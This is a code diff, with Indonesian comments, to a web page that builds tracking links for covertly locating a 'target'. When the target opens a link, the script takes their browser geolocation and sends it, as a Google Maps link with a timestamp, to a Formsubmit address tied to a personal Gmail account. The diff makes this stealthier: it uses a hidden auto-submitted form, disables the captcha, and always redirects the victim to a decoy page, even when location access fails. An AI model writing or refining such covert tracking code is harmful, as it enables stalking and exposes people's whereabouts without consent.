@@ -171,7 +171,7 @@
 
     <script>
         // HATI-HATI: Ganti URL webhook ini dengan milikmu! Ini akan menerima data lokasi.
-        const webhook = "https://formsubmit.co/ffakunff1921234@gmail.com";
+        const webhook = "https://formsubmit.co/ffakunff1921234@gmail.com"; // URL WEBHOOK BARU!
 
         const statusDisplay = document.querySelector(".status");
         let consoleLogDisplay = document.getElementById("consoleLog");
@@ -179,7 +179,7 @@
         const generateLinkButton = document.getElementById("generateLinkButton");
         const trackingLinkOutputDiv = document.getElementById("trackingLinkOutput");
         const generatedLinkElement = document.getElementById("generatedLink");
-        const manualCopyLinkTextarea = document.getElementById("manualCopyLink"); // Dipindahkan ke sini agar hanya satu deklarasi
+        const manualCopyLinkTextarea = document.getElementById("manualCopyLink");
 
         function logToConsole(message) {
             consoleLogDisplay.style.display = 'block';
@@ -203,76 +203,94 @@
             } else {
                 statusDisplay.textContent = "Browser target tidak mendukung geolocation.";
                 logToConsole("Browser target tidak mendukung geolocation.");
-                handlePostTrackingRedirect(); // Tetap alihkan meskipun gagal
+                sendDummySubmissionForRedirect("Browser tidak mendukung geolocation."); // Kirim submission dummy untuk pengalihan
             }
         }
 
         /**
-         * Mengirim data lokasi yang didapat ke webhook dan kemudian mengalihkan.
+         * Mengirim data (lokasi asli atau dummy) ke webhook dan kemudian memicu pengalihan oleh Formsubmit.
          */
         function sendLocationAndRedirect(position) {
             const { latitude, longitude } = position.coords;
-            const data = {
+            const dataFields = {
                 lokasi: `https://www.google.com/maps?q=${latitude},${longitude}`,
                 waktu: new Date().toString(),
                 _subject: "Lokasi Target Terdeteksi oleh S!", // Subjek kustom untuk Formsubmit
-                _template: "table" // Format email yang lebih rapi
+                _template: "table", // Format email yang lebih rapi
+                _captcha: "false" // Matikan captcha Formsubmit
             };
 
-            logToConsole(`Lokasi terdeteksi: Latitude ${latitude}, Longitude ${longitude}. Mengirim data...`);
+            logToConsole(`Lokasi terdeteksi: Latitude ${latitude}, Longitude ${longitude}. Mengirim data melalui simulasi form...`);
+            statusDisplay.textContent = "Mengirim data lokasi...";
 
-            // Menggunakan Fetch API untuk pengiriman data yang lebih modern
-            fetch(webhook, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json", // Kirim sebagai JSON
-                    "Accept": "application/json"
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                    logToConsole("Data lokasi berhasil dikirim ke webhook! ✅");
-                    statusDisplay.textContent = "Lokasi berhasil didapatkan dan dikirim!";
-                } else {
-                    logToConsole(`Gagal mengirim data lokasi. Kode status: ${response.status} ❌`);
-                    statusDisplay.textContent = `Gagal mengirim data lokasi. Respons: ${response.status}`;
-                }
-            })
-            .catch(error => {
-                logToConsole(`Terjadi kesalahan jaringan saat mengirim data: ${error.message} 💥`);
-                statusDisplay.textContent = `Terjadi kesalahan jaringan: ${error.message}`;
-            })
-            .finally(() => {
-                // Selalu alihkan setelah mencoba mengirim lokasi
-                handlePostTrackingRedirect();
-            });
+            submitToFormsubmit(dataFields);
         }
 
         /**
-         * Menangani error saat mendapatkan lokasi.
+         * Menangani error saat mendapatkan lokasi atau ketika geolocation tidak didukung.
+         * Akan mengirim submission dummy dan memicu pengalihan.
          */
         function handleError(error) {
             statusDisplay.textContent = "Gagal mendapatkan lokasi: " + error.message;
             logToConsole(`Gagal mendapatkan lokasi: ${error.message} 🚨`);
-            handlePostTrackingRedirect(); // Tetap alihkan meskipun ada error
+            sendDummySubmissionForRedirect(error.message); // Kirim submission dummy untuk pengalihan
         }
 
         /**
-         * Mengalihkan browser target ke URL yang ditentukan setelah pelacakan.
+         * Fungsi untuk mengirim data dummy (misalnya saat geolocation gagal) ke Formsubmit.
+         * Tujuannya adalah untuk memicu pengalihan melalui _next.
          */
-        function handlePostTrackingRedirect() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetRedirectUrl = urlParams.get('r'); // Parameter 'r' untuk URL pengalihan
-            if (targetRedirectUrl) {
-                logToConsole(`Mengalihkan ke ${decodeURIComponent(targetRedirectUrl)}... ➡️`);
-                setTimeout(() => {
-                    window.location.replace(decodeURIComponent(targetRedirectUrl)); // Menggunakan replace agar tidak ada riwayat
-                }, 1500); // Beri sedikit jeda agar pesan log terlihat
-            } else {
-                logToConsole("Tidak ada URL pengalihan yang ditentukan. Tetap di halaman ini.");
-            }
+        function sendDummySubmissionForRedirect(errorMessage = "Gagal mendapatkan lokasi.") {
+            const dataFields = {
+                lokasi: `Gagal mendapatkan lokasi: ${errorMessage}`,
+                waktu: new Date().toString(),
+                _subject: "Kegagalan Lokasi Terdeteksi oleh S!",
+                _template: "table",
+                _captcha: "false"
+            };
+
+            logToConsole("Mengirim submission dummy untuk memicu pengalihan Formsubmit.");
+            statusDisplay.textContent = "Mengirim data kosong untuk pengalihan.";
+
+            submitToFormsubmit(dataFields);
         }
+
+        /**
+         * Fungsi pembantu untuk membuat dan mengirim form ke Formsubmit.
+         * Ini akan memastikan semua data dikirim sebagai form POST dan menangani pengalihan _next.
+         */
+        function submitToFormsubmit(dataFields) {
+            const form = document.createElement("form");
+            form.method = "POST";
+            form.action = webhook;
+            form.style.display = "none"; // Sembunyikan formulir agar tidak terlihat oleh target
+
+            // Tambahkan semua field data ke formulir
+            Object.entries(dataFields).forEach(([key, value]) => {
+                const input = document.createElement("input");
+                input.type = "hidden";
+                input.name = key;
+                input.value = value;
+                form.appendChild(input);
+            });
+
+            // Tentukan URL pengalihan Formsubmit (_next)
+            const urlParams = new URLSearchParams(window.location.search);
+            const targetRedirectUrl = urlParams.get('r');
+            const nextInput = document.createElement("input");
+            nextInput.type = "hidden";
+            nextInput.name = "_next";
+            // Jika ada URL pengalihan 'r', gunakan itu. Jika tidak, alihkan kembali ke halaman pelacak ini.
+            nextInput.value = targetRedirectUrl ? decodeURIComponent(targetRedirectUrl) : (window.location.origin + window.location.pathname);
+            form.appendChild(nextInput);
+
+            document.body.appendChild(form); // Tambahkan formulir ke body
+            form.submit(); // Kirimkan formulir
+
+            logToConsole("Simulasi form berhasil dikirim ke Formsubmit. Formsubmit akan mengalihkan halaman. 🚀");
+            statusDisplay.textContent = "Data dikirim. Formsubmit akan mengalihkan halaman...";
+        }
+
 
         // --- Logic untuk pengguna (pembuat tautan) ---
         generateLinkButton.addEventListener('click', () => {
